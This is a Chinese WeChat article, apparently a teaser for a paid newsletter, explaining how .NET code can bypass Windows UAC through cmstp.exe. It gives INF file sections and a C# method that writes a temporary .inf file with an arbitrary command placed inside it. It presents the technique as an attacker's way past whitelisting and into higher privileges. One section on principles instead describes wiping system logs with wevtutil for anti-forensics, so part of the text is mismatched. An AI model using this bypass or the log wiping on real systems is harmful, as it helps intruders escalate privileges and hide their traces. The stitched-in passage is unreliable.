---
title: .NET内网实战：调用CMSTP实现UAC绕过
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497847&idx=2&sn=e89506db22d9f02dea0810b59327e0b0&chksm=fa59569acd2edf8c1695b78121c64eb78659cd015c5853bc4cbb019645bf5e0ecff9f2fcf7a3&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-01
fetch_date: 2025-10-06T20:07:49.458600
---

# .NET内网实战：调用CMSTP实现UAC绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8gpkNmusgqvjCia7fa5hfGssogsTkYtghUa8TLMd0nyNOrKMpgicibwCqpXH6tiapeC0Ubg9gjQpDaMQ/0?wx_fmt=jpeg)

# .NET内网实战：调用CMSTP实现UAC绕过

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

基本介绍

本文内容部分节选自小报童《.NET 通过调用CMSTP进程实现UAC绕过》，完整的文章内容请加入小报童后订阅查看。现在限时只需59元，永久买断！目前已有280+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8gpkNmusgqvjCia7fa5hfGsZ3JsBJ8diasK1u6RNgDvtibicVP8BEItxYeCjQPd0ZP0xge7fibWBYUjMA/640?wx_fmt=png&from=appmsg)

03

原理分析

在渗透测试或攻击活动中，清理日志是一项关键的操作，用于掩盖攻击者的行为，避免被防御者发现和追踪。通过 .NET 程序调用 wevtutil 命令，可以高效地清空所有的系统日志，这种方法具有较强的隐蔽性，能够绕过大部分传统的日志分析工具，为攻击者提供了一种强有力的反取证手段。

## 3.1 [version]

cmstp.exe的主要用途是帮助 IT 管理员或用户快速部署 VPN 配置或网络连接文件。一个合法的VPN配置信息一般包括网络配置、用户凭据、注册表修改、安装命令等内容。首先，我们看到配置文件中的头部version部分内容，具体如下所示.

```
```
[version]
Signature=$chicago$
AdvancedINF=2.5
```
```

此处的 Signature=$chicago$，是标准的 INF 文件签名，表示文件兼容 Windows.

## 3.2 [DefaultInstall]

在 CMSTP (Connection Manager Profile Installer) 的 INF 文件中，[DefaultInstall] 部分定义了安装过程中需要执行的主要任务。

```
```
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
```
```

CustomDestination 参数 表示指向一个逻辑节点（Section），通常是涉及文件自定义的安装位置。

## 3.3 [AllUser\_LDIDSection]

此处的 [AllUSer\_LDIDSection] 定义了注册表的修改操作，将安装路径写入 HKLM 的 InstallPath 键中。

```
```
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
```
```

此处配置的 CMMGR32.EXE 是 Windows 系统中的一个合法可执行文件，正常情况下通过cmstp.exe安装配置文件后，交由 CMMGR32.exe 加载执行。

## 3.4 编码实现

定义一个方法 SetInfFile，主要功能是动态随机生成一个 .inf 配置文件，并将指定的命令注入其中。

```
```
public static string SetInfFile(string CommandToExecute)
{
		string value = Path.GetRandomFileName().Split(new char[]
		{
			Convert.ToChar(".")
		})[0];
		string value2 = "C:\\windows\\temp";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(value2);
		stringBuilder.Append("\\");
		stringBuilder.Append(value);
		stringBuilder.Append(".inf");
		StringBuilder stringBuilder2 = new StringBuilder(CMSTPBypass.InfData);
		stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString());
		return stringBuilder.ToString();
}
```
```

生成的 \*.inf 扩展名文件位于 C:\windows\temp\ 目录下，另外， 替换模板中的占位符 REPLACE\_COMMAND\_LINE 为传入的命令 CommandToExecute，比如，如果传入 cmd.exe /c calc.exe，运行如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8gpkNmusgqvjCia7fa5hfGs1bNq4g5yibic9icEYUdGv9D6iabojp92O2xOWyeHKlwyMMJRBsud9SP1RA/640?wx_fmt=other&from=appmsg)

综上，通过对 cmstp.exe 的深入剖析，我们可以看到，合法工具在特定条件下同样可能成为攻击链中的关键环节。利用其对自定义 INF 文件的支持，攻击者能够在不触发传统安全防护机制的情况下，执行任意命令或代码，从而实现绕过白名单和权限提升的目标。想要了解完整或者更多的内网安全方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需59元，永久买断！目前已有280+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibXibiaRyFPI439dFybReKxQoa5OnhetdDKdnd36lG844cFIWNaib1adpRCXOJbRb6mVicfic8tLqXl9Pw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过